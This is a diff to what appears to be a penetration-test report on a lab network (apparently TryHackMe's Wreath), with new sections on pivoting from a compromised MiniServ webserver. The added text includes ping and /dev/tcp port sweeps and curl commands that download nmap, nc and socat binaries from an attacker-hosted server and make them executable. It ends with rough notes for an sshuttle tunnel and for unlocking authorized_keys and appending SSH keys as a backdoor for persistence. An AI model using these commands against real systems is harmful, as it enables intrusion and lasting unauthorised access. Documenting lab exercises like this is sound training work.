@@ -26,12 +26,15 @@ The porpuse of this task is to perform attacks similar to those of a hacker and 
 My objective is to evaluathe the overall security of the network, identify assets and exploit existing flaws while reporting findings back to my friend.
 
 The the following IP was provided by the friend as initial access to this accessment:
-    - **10.200.15.200**
+    - **10.200.105.200**
 
 This first machine forwards the connection to a second machine, where a webserver has been hosted. 
 In this network there is also a personal computer of the friend.
 
-During this assessment we were able to <!-- write end up result -->
+During this assessment we were able to access the server where the website is hosted by exploiting a kwown vulnerability of the webserver *MiniServ 1.890*. In this access, we discovered two other IPs within this network:
+
+  - **10.200.105.200**
+  - **10.200.105.250**
 
 ## Recommendations
 
@@ -141,7 +144,7 @@ Running services or command as *root* should be restricted to minimal essential 
 ## Service Enumeration
 
 ### Network Enumeration
-The first part of this assesment was dedicated to the enumeration of the provided IP Address **10.200.15.200**. This enumeration was performed using the network scanner nmap:
+The first part of this assesment was dedicated to the enumeration of the provided IP Address **10.200.105.200**. This enumeration was performed using the network scanner nmap:
 
 ```
 nmapAutomator.sh -H 10.200.105.200  -t full -o wreath
@@ -263,7 +266,63 @@ The result is a stabilized shell as shown above:
 Accessing the folder */root/.ssh/id_rsa*, it was possible to access the private key to access the server through ssh and transfer it to the attacking machine.
 
 ## Pivoting and Accessing other Servers
-The next step was using this server to discover and enumerate possibles endpoints in this network.
+With the access to server where the website is hosted, it is possible to perform another enumeration to discover what other endepoints exists withing the internal network.
+
+Using the command below, it was possible to send ICMP packets to possible hosts on on the network:
+
+```
+for i in {1..255}; do (ping -c 1 10.200.105.${i} | grep "bytes from" &); done
+```
+As response, the command showed us that there is another IP on this network:
+  - **10.200.105.250**
+
+The following command allowed us to perform a port scanning on these to IPs to identify openned ports:
+
+```
+for i in {1..65535}; do (echo > /dev/tcp/10.200.105.250/$i) >/dev/null 2>&1 && echo $i is open; done
+```
+
+The result of this scanned showed us that the following ports are opnned on this host:
+- 22
+- 1337
+
+Our access allowed us to transfer files between the our attacking machine and the compromised webserver. We used the following commands:
+```
+# Create a webserver on the attacking machine where the binaries are being hosted:
+sudo python3 -m http.server 80
+
+# From the comprimised server, we then fechted the desired files, in this case nmap and socat
+curl ATTACKING_IP/path/to/file -o /tmp/path/to/file && chmod +x /tmp/path/to/file
+
+curl 10.50.106.78/nmap -o /tmp/nmap-pat && chmod +x /tmp/nmap-pat
+curl 10.50.106.78/nc -o /tmp/nc-pat && chmod +x /tmp/nc-pat 
+curl 10.50.106.78/socat -o /tmp/socat-pat && chmod +x /tmp/socat-pat
+```
+
+The transfer binaries are *nmap* and *socat*. The first one to perform a network scanning and the second one to stablish contact with the hosts within the network. With *nmap*, it was possible to get result about the services running on the openned ports of the host **10.200.105.250**:
+
+```
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1337/tcp open  menandmice-dns
+```
+sshuttle -R  pwned@172.16.20.7 172.16.0.0/16
+--ssh-cmd "ssh -i priv_key"
+
+chattr -i authorized_keys
+cat screamz_rsa.pub >> authorized_keys
+chattr +i authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" >> authorized_keys
+
+
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBJjUen5EgdhSbhLrxxz9FIBnzBqUu9D5PrLlH3ckTT bruno.macedoxxi@hotmail.com" >> authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" > pat.pub
+
+
+
+
 
 ## Maintaining Access
 
